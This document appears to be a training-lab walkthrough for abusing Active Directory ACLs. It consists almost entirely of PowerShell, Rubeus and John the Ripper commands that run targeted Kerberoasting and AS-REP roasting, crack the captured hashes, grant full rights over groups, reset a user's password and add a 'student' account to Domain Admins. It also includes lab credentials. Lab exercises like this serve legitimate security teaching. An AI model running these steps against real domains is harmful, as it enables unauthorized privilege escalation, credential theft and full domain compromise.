# AD-ACL Abuse

##### Use SharpHound to collect all the data
```
cd C:\Tools\BloodHound\BloodHound\resources\app\Collectors
powershell -ep bypass 
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All
```

##### Open the BloodHound GUI:
```
cd C:\Tools\BloodHound\BloodHound
.\BloodHound.exe
```

Use the following credentials to log in:

- **Username:** neo4j
- **Password:** Password@123

##### Upload the zip from the location **C:\Tools\BloodHound\BloodHound\resources\app\Collectors**

### Task 1: Exploit a path to DnsAdmins by Kerberoasting david.

##### Use the PowerView
```
cd C:\Tools
powershell -ep bypass 
. .\PowerView.ps1
```

##### Chcek David is Kerberoastable or not
```
Get-DomainUser -Identity david | select samaccountname, serviceprincipalname
```

##### Set a random SPN for david
```
Set-DomainObject david -Set @{serviceprincipalname='ops/whatever15699'}
```

##### Check if the SPN was set using the following command:

```
Get-DomainUser -Identity david | select samaccountname, serviceprincipalname
```

##### Use Rubeus to perform the kerberoasting attack
```
mkdir HASHES
./Rubeus.exe kerberoast /user:david /outfile:C:\Tools\HASHES\david_hash.txt
```

##### Use John The RIpper for cracking the password. Unzip johnTheRipper from C:\Tools
```
.\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe --format=krb5tgs .\HASHES\david_hash.txt --wordlist=.\10k-worst-pass.txt
```

##### Check group membership of the student
```
Get-NetGroup -UserName "student" | select name
```

##### Add student to test group
```
$SecPassword = ConvertTo-SecureString 'abc_123321' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('research\david', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "test_team" -PrincipalIdentity "david" -Rights All

Add-DomainGroupMember -Identity 'test_team' -Members 'student' -Credential $Cred
```

##### Again check group membership of the student
```
Get-NetGroup -UserName "student" | select name
```

### Task 2: Exploit a path to Group Policy Creator Owners group by AS-REP Roasting john.

##### Check if John is AS-REP rostable
```
Get-DomainUser -Identity john | select samaccountname, useraccountcontrol
```

##### Disable Kerberos pre-authentication for john
```
Set-DomainObject -Identity john -XOR @{UserAccountControl=4194304}

Get-DomainUser -Identity john | select samaccountname, useraccountcontrol
```

##### Use Rubeus to AS-REP roast
```
./Rubeus.exe asreproast /user:john /outfile:C:\Tools\HASHES\john_hash.txt 
```

##### Use Ripper to crack the password
```
.\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe --format=krb5asrep .\HASHES\john_hash.txt --wordlist=.\10k-worst-pass.txt
```

##### Add sutdent to the group
```
$SecPassword = ConvertTo-SecureString 'pepper_123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('research\john', $SecPassword)

Set-DomainObjectOwner -Identity "dev_team" -OwnerIdentity john -Credential $Cred

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "dev_team" -PrincipalIdentity "john" -Rights All

Add-DomainGroupMember -Identity 'dev_team' -Members 'student' -Credential $Cred
```

##### Check group membership of the student
```
Get-NetGroup -UserName "student" | select name
```

### Task 3: Exploit the path to Domain Admins
##### Change tom's password
```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity tom -AccountPassword $UserPassword
```

##### Use the privileges of tom to add student to the Domain Admins group
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('research\tom', $SecPassword)

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'student' -Credential $Cred
```

##### Check the group membership of the student
```
Get-NetGroup -UserName "student" | select name
```
